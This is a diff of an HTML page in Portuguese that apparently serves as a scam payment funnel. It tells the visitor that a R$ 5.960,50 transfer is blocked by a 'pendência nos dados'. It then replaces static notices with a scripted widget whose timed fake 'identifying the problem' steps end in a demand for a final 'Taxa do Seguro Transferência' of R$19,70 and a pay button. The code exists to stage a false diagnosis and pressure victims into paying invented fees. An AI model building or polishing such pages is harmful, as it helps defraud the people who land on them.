@@ -879,61 +879,538 @@ src="https://www.facebook.com/tr?id=1884540289109881&ev=PageView&noscript=1"
         <div class="amount-value">R$ 5.960,50</div>
       </div>
 
-      <h1 class="section-title">Problemas na transferência</h1>
+<h1 class="section-title">Problemas na transferência</h1>
 
-      <!-- 3. Caixa Cinza de Notificações -->
-      <div class="problemas-container" id="ad2">
-        <!-- Item 1: Engrenagem Laranja -->
-        <div class="item-card" id="text1">
-          <div class="icon-circle icon-orange">
-            <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="#ffffff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-              <circle cx="12" cy="12" r="3"></circle>
-              <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path>
-            </svg>
-          </div>
-          <div class="item-text">
-            Estamos identificando o problema nos seus dados!
-          </div>
-        </div>
+<!-- COMPONENTE DE STATUS: substitua os blocos antigos de status por este único componente -->
+<style>
+  /* Escopo isolado para evitar conflitos com o CSS restante da página. */
+  #transferStatusWidget,
+  #transferStatusWidget * {
+    box-sizing: border-box;
+  }
 
-        <!-- Item 2: Triângulo Vermelho de Aviso -->
-        <div class="item-card" id="text2">
-          <div class="icon-circle icon-red">
-            <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="#ffffff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-              <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
-              <line x1="12" y1="9" x2="12" y2="13"></line>
-              <line x1="12" y1="17" x2="12.01" y2="17"></line>
-            </svg>
-          </div>
-          <div class="item-text">
-            Identificamos que há uma pendência nos seus dados de transferência!
-          </div>
-        </div>
+  #transferStatusWidget {
+    width: 100%;
+    max-width: 375px;
+    margin: 0 auto;
+    padding: 24px 20px 18px;
+    border-radius: 22px;
+    background: #e5e5e5;
+    color: #333;
+    font-family: Arial, Helvetica, sans-serif;
+  }
 
-        <!-- Item 3: Alerta Vermelho -->
-        <div class="alert-card-red" id="text3">
-          <div class="icon-white-circle">
-            <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="#DC2626" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
-              <line x1="12" y1="8" x2="12" y2="12"></line>
-              <line x1="12" y1="16" x2="12.01" y2="16"></line>
-            </svg>
-          </div>
-          <div class="alert-red-text">
-            É necessário realizar o pagamento da Última taxa (Taxa do Seguro Transferência) para corrigir a pendência e liberar sua transferência. O valor é único e fixo de R$19,70.
-          </div>
-        </div>
+  #transferStatusWidget #initialScreen { display: block; }
+  #transferStatusWidget #progressScreen { display: none; width: 100%; }
 
-        <!-- Item 4: Botão de Pagamento -->
-        <div id="finalButton">
-          <button class="btn-pagar-seguro" onclick="checkout(event)">
-            <span>Pagar o Seguro Transferência</span>
-            <svg viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
-              <polyline points="9 18 15 12 9 6"></polyline>
-            </svg>
-          </button>
+  #transferStatusWidget .status-card {
+    width: 100%;
+    margin: 0;
+    padding: 0;
+    overflow: hidden;
+    border-radius: 15px;
+    background: #fff;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, .12);
+  }
+
+  #transferStatusWidget .status-header {
+    display: block !important;
+    width: 100%;
+    margin: 0;
+    padding: 10px 15px;
+    background: #383838;
+    color: #fff;
+  }
+
+  #transferStatusWidget .status-header h3 {
+    display: block;
+    margin: 0 !important;
+    padding: 0;
+    color: #fff !important;
+    font: 700 17px/22px Arial, Helvetica, sans-serif;
+  }
+
+  /* Força as duas linhas a ficarem visíveis, anulando regras genéricas antigas. */
+  #transferStatusWidget .status-card .status-item {
+    display: flex !important;
+    align-items: center !important;
+    gap: 15px !important;
+    width: 100% !important;
+    height: auto !important;
+    min-height: 69px !important;
+    margin: 0 !important;
+    padding: 10px 15px !important;
+    overflow: visible !important;
+    background: #fff !important;
+    opacity: 1 !important;
+    visibility: visible !important;
+    transform: none !important;
+    pointer-events: auto !important;
+  }
+
+  #transferStatusWidget .status-icon {
+    display: flex !important;
+    align-items: center;
+    justify-content: center;
+    flex: 0 0 40px;
+    width: 40px;
+    height: 40px;
+    margin: 0;
+    padding: 0;
+    border-radius: 50%;
+    color: #fff !important;
+  }
+
+  #transferStatusWidget .status-success {
+    background: #f59e0b;
+    animation: transferPulseOrange 2s ease-in-out infinite;
+  }
+
+  #transferStatusWidget .status-success span {
+    display: block;
+    color: #fff !important;
+    font-size: 27px;
+    font-weight: 400;
+    line-height: 1;
+  }
+
+  #transferStatusWidget .status-pending {
+    background: #e11d48;
+    animation: transferPulseRed 2s ease-in-out infinite;
+  }
+
+  #transferStatusWidget .status-pending svg {
+    display: block !important;
+    width: 24px;
+    height: 24px;
+    fill: none;
+    stroke: #fff !important;
+  }
+
+  #transferStatusWidget .status-label {
+    display: block !important;
+    flex: 1 1 auto !important;
+    min-width: 0 !important;
+    margin: 0 !important;
+    padding: 0 !important;
+    color: #333 !important;
+    font: 700 16px/1.3 Arial, Helvetica, sans-serif !important;
+    text-indent: 0 !important;
+    text-transform: none !important;
+    visibility: visible !important;
+    opacity: 1 !important;
+  }
+
+  #transferStatusWidget .status-description {
+    display: block;
+    margin: 20px 8px 17px;
+    padding: 0;
+    color: #626262;
+    font-size: 16px;
+    font-weight: 700;
+    line-height: 1.4;
+    text-align: center;
+  }
+
+  #transferStatusWidget .button-area {
+    display: flex !important;
+    align-items: center;
+    justify-content: center;
+    width: 100%;
+    margin: 0;
+    padding: 0;
+  }
+
+  #transferStatusWidget .status-button {
+    display: flex !important;
+    align-items: center;
+    justify-content: space-between;
+    gap: 12px;
+    width: 100%;
+    max-width: 335px;
+    min-width: 0;
+    min-height: 70px;
+    margin: 20px 0 0;
+    padding: 14px 18px;
+    border: 0;
+    border-radius: 14px;
+    background: #2865ae;
+    color: #fff !important;
+    font: 700 17px/1.3 Arial, Helvetica, sans-serif;
+    text-align: left;
+    cursor: pointer;
+    animation: transferPulseButton 1.5s ease-in-out infinite;
+    transition: background .2s ease;
+    -webkit-tap-highlight-color: transparent;
+  }
+
+  #transferStatusWidget .status-button span {
+    display: block;
+    flex: 1;
+    color: #fff !important;
+  }
+
+  #transferStatusWidget .status-button svg {
+    display: block;
+    flex: 0 0 32px;
+    width: 32px;
+    height: 32px;
+    fill: none;
+    stroke: #fff !important;
+  }
+
+  #transferStatusWidget .status-button:hover { background: #1e4f8b; }
+  #transferStatusWidget .status-button:active { transform: scale(.98); }
+
+  #transferStatusWidget .loading-wrap {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    gap: 14px;
+    width: 100%;
+    min-height: 120px;
+    padding: 24px 10px;
+    text-align: center;
+  }
+
+  #transferStatusWidget .loading-wrap.initial-loading {
+    align-items: center;
+    justify-content: flex-start;
+    min-height: 420px;
+    padding-top: 18px;
+  }
+
+  #transferStatusWidget .loading-spinner {
+    flex: 0 0 42px;
+    width: 42px;
+    height: 42px;
+    border: 6px solid #ccc;
+    border-top-color: #2865ae;
+    border-radius: 50%;
+    animation: transferSpin .75s linear infinite;
+  }
+
+  #transferStatusWidget .loading-text {
+    color: #626262;
+    font-size: 14px;
+    font-weight: 600;
+    line-height: 1.4;
+  }
+
+  #transferStatusWidget .flow-card,
+  #transferStatusWidget .flow-alert {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    width: 100%;
+    margin: 0 0 14px;
+    padding: 16px 14px;
+    border-radius: 14px;
+    opacity: 0;
+    transform: translateY(12px);
+    animation: transferAppear .45s ease forwards;
+  }
+
+  #transferStatusWidget .flow-card {
+    background: #fff;
+    box-shadow: 0 2px 5px rgba(0, 0, 0, .12);
+  }
+
+  #transferStatusWidget .flow-icon {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex: 0 0 40px;
+    width: 40px;
+    height: 40px;
+    border-radius: 50%;
+    color: #fff;
+  }
+
+  #transferStatusWidget .flow-icon.orange { background: #f59e0b; }
+  #transferStatusWidget .flow-icon.red { background: #e11d48; }
+
+  #transferStatusWidget .flow-icon svg {
+    display: block;
+    width: 24px;
+    height: 24px;
+    fill: none;
+    stroke: #fff;
+    stroke-width: 2.3;
+    stroke-linecap: round;
+    stroke-linejoin: round;
+  }
+
+  #transferStatusWidget .flow-message {
+    flex: 1;
+    min-width: 0;
+    color: #333;
+    font-size: 15px;
+    font-weight: 700;
+    line-height: 1.4;
+    overflow-wrap: anywhere;
+  }
+
+  #transferStatusWidget .flow-alert {
+    background: #b91c1c;
+    color: #fff;
+    padding: 18px 14px;
+  }
+
+  #transferStatusWidget .alert-icon {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex: 0 0 40px;
+    width: 40px;
+    height: 40px;
+    border-radius: 50%;
+    background: #fff;
+    color: #b91c1c;
+    font-size: 27px;
+    font-weight: 700;
+  }
+
+  #transferStatusWidget .alert-message {
+    flex: 1;
+    min-width: 0;
+    color: #fff;
+    font-size: 14px;
+    font-weight: 700;
+    line-height: 1.4;
+    overflow-wrap: anywhere;
+  }
+
+  @keyframes transferSpin { to { transform: rotate(360deg); } }
+  @keyframes transferAppear { to { opacity: 1; transform: translateY(0); } }
+  @keyframes transferPulseOrange {
+    0%, 100% { box-shadow: 0 0 0 0 rgba(245, 158, 11, 0); }
+    50% { box-shadow: 0 0 0 5px rgba(245, 158, 11, .18); }
+  }
+  @keyframes transferPulseRed {
+    0%, 100% { box-shadow: 0 0 0 0 rgba(225, 29, 72, 0); }
+    50% { box-shadow: 0 0 0 5px rgba(225, 29, 72, .16); }
+  }
+  @keyframes transferPulseButton {
+    0%, 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(40, 101, 174, .35); }
+    50% { transform: scale(1.02); box-shadow: 0 0 0 7px rgba(40, 101, 174, 0); }
+  }
+
+  @media (max-width: 360px) {
+    #transferStatusWidget { padding: 20px 16px 14px; }
+    #transferStatusWidget .status-label { font-size: 15px !important; }
+    #transferStatusWidget .status-description { margin-right: 4px; margin-left: 4px; font-size: 15px; }
+    #transferStatusWidget .status-button { padding: 12px 14px; font-size: 16px; }
+    #transferStatusWidget .flow-message { font-size: 14px; }
+  }
+
+  @media (prefers-reduced-motion: reduce) {
+    #transferStatusWidget .status-icon,
+    #transferStatusWidget .status-button,
+    #transferStatusWidget .loading-spinner {
+      animation: none !important;
+      transition: none !important;
+    }
+    #transferStatusWidget .flow-card,
+    #transferStatusWidget .flow-alert { opacity: 1; transform: none; }
+  }
+</style>
+
+<div id="transferStatusWidget" class="status-container">
+  <div id="transferInitialScreen">
+    <div class="status-card">
+      <div class="status-header"><h3>Status</h3></div>
+      <div class="status-item">
+        <div class="status-icon status-success"><span aria-hidden="true">✓</span></div>
+        <div class="status-label"><b> <h3> Pagamento Concluído </h3></b></div>
+      </div>
+      <div class="status-item">
+        <div class="status-icon status-pending">
+          <svg viewBox="0 0 24 24" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <path d="M10.3 3.9 1.9 18a2 2 0 0 0 1.7 3h16.8a2 2 0 0 0 1.7-3L13.7 3.9a2 2 0 0 0-3.4 0z"></path>
+            <line x1="12" y1="9" x2="12" y2="13"></line>
+            <line x1="12" y1="17" x2="12.01" y2="17"></line>
+          </svg>
         </div>
+        <div class="status-label"><b> <h3> Pendência nos Dados </h3></b></div>
       </div>
     </div>
+
+    <p class="status-description"><b> Seu pagamento foi concluido com sucesso, porém foi encontrado uma pendência nos seus dados. Clique abaixo para resolver esse problema! </b></p>
+
+    <div class="button-area">
+      <button type="button" class="status-button" id="transferStartButton">
+        <span>Resolver Problema</span>
+        <svg viewBox="0 0 24 24" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="9 18 15 12 9 6"></polyline></svg>
+      </button>
+    </div>
+  </div>
+
+  <div id="transferProgressScreen" aria-live="polite" aria-atomic="false"></div>
+</div>
+
+<script>
+(function () {
+  "use strict";
+  const root = document.getElementById("transferStatusWidget");
+  if (!root) return;
+
+  const initialScreen = root.querySelector("#transferInitialScreen");
+  const progressScreen = root.querySelector("#transferProgressScreen");
+  const startButton = root.querySelector("#transferStartButton");
+  const delayMs = 1000;
+  let started = false;
+
+  const gearIcon = '<svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="3"></circle><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 1 1-4 0v-.09a1.65 1.65 0 0 0-1-1.51 1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 1 1 0-4h.09a1.65 1.65 0 0 0 1.51-1 1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33 1.65 1.65 0 0 0 1-1.51V3a2 2 0 1 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82 1.65 1.65 0 0 0 1.51 1H21a2 2 0 1 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"></path></svg>';
+  const warningIcon = '<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M10.3 3.9 1.9 18a2 2 0 0 0 1.7 3h16.8a2 2 0 0 0 1.7-3L13.7 3.9a2 2 0 0 0-3.4 0z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>';
+
+  const steps = [
+    {
+      kind: "card",
+      tone: "orange",
+      icon: gearIcon,
+      text: "Estamos identificando o problema nos seus dados!"
+    },
+    {
+      kind: "card",
+      tone: "red",
+      icon: warningIcon,
+      text: "Identificamos que há uma pendência nos seus dados de transferência!"
+    },
+    {
+      kind: "alert",
+      text: "É necessário realizar o pagamento da Última taxa (Taxa do Seguro Transferência) para corrigir a pendência e liberar sua transferência. O valor é único e fixo de R$19,70."
+    }
+  ];
+
+  function makeLoader(label, initial) {
+    const wrap = document.createElement("div");
+    wrap.className = "loading-wrap" + (initial ? " initial-loading" : "");
+    wrap.setAttribute("role", "status");
+    wrap.setAttribute("aria-label", label || "Carregando");
+
+    const spinner = document.createElement("div");
+    spinner.className = "loading-spinner";
+    spinner.setAttribute("aria-hidden", "true");
+    wrap.appendChild(spinner);
+
+    if (label) {
+      const text = document.createElement("div");
+      text.className = "loading-text";
+      text.textContent = label;
+      wrap.appendChild(text);
+    }
+    return wrap;
+  }
+
+  function makeStep(step) {
+    if (step.kind === "alert") {
+      const alert = document.createElement("div");
+      alert.className = "flow-alert";
+      const icon = document.createElement("div");
+      icon.className = "alert-icon";
+      icon.setAttribute("aria-hidden", "true");
+      icon.textContent = "!";
+      const text = document.createElement("div");
+      text.className = "alert-message";
+      text.textContent = step.text;
+      alert.append(icon, text);
+      return alert;
+    }
+
+    const card = document.createElement("div");
+    card.className = "flow-card";
+    const icon = document.createElement("div");
+    icon.className = "flow-icon " + step.tone;
+    icon.innerHTML = step.icon;
+    const text = document.createElement("div");
+    text.className = "flow-message";
+    text.textContent = step.text;
+    card.append(icon, text);
+    return card;
+  }
+
+  
+function showFinalButton() {
+  const area = document.createElement("div");
+  area.id = "finalButton";
+
+  const button = document.createElement("button");
+  button.type = "button";
+  button.className = "btn-pagar-seguro";
+
+  const label = document.createElement("span");
+  label.textContent = "Pagar o Seguro Transferência";
+
+  const svg = document.createElementNS(
+    "http://www.w3.org/2000/svg",
+    "svg"
+  );
+
+  svg.setAttribute("viewBox", "0 0 24 24");
+  svg.setAttribute("fill", "none");
+  svg.setAttribute("stroke", "#ffffff");
+  svg.setAttribute("stroke-width", "3");
+  svg.setAttribute("stroke-linecap", "round");
+  svg.setAttribute("stroke-linejoin", "round");
+  svg.setAttribute("aria-hidden", "true");
+
+  const polyline = document.createElementNS(
+    "http://www.w3.org/2000/svg",
+    "polyline"
+  );
+
+  polyline.setAttribute("points", "9 18 15 12 9 6");
+
+  svg.appendChild(polyline);
+  button.append(label, svg);
+
+  // Executa a função checkout(event) ao clicar
+  button.addEventListener("click", function (event) {
+    checkout(event);
+  });
+
+  area.appendChild(button);
+  progressScreen.appendChild(area);
+}
+
+
+  function showStep(index) {
+    progressScreen.appendChild(makeStep(steps[index]));
+    const loader = makeLoader(index === steps.length - 1 ? "Finalizando orientações..." : "Carregando próxima orientação...");
+    progressScreen.appendChild(loader);
+
+    window.setTimeout(function () {
+      loader.remove();
+      if (index < steps.length - 1) {
+        showStep(index + 1);
+      } else {
+        showFinalButton();
+      }
+    }, delayMs);
+  }
+
+  function startFlow() {
+    if (started) return;
+    started = true;
+    startButton.disabled = true;
+    initialScreen.style.display = "none";
+    progressScreen.style.display = "block";
+    progressScreen.replaceChildren();
+    progressScreen.appendChild(makeLoader("", true));
+
+    window.setTimeout(function () {
+      progressScreen.replaceChildren();
+      showStep(0);
+    }, delayMs);
+  }
+
+  startButton.addEventListener("click", startFlow);
+})();
+</script>
+
+
   </main>
 
   <!-- 4. Rodapé com Logotipos Oficiais -->
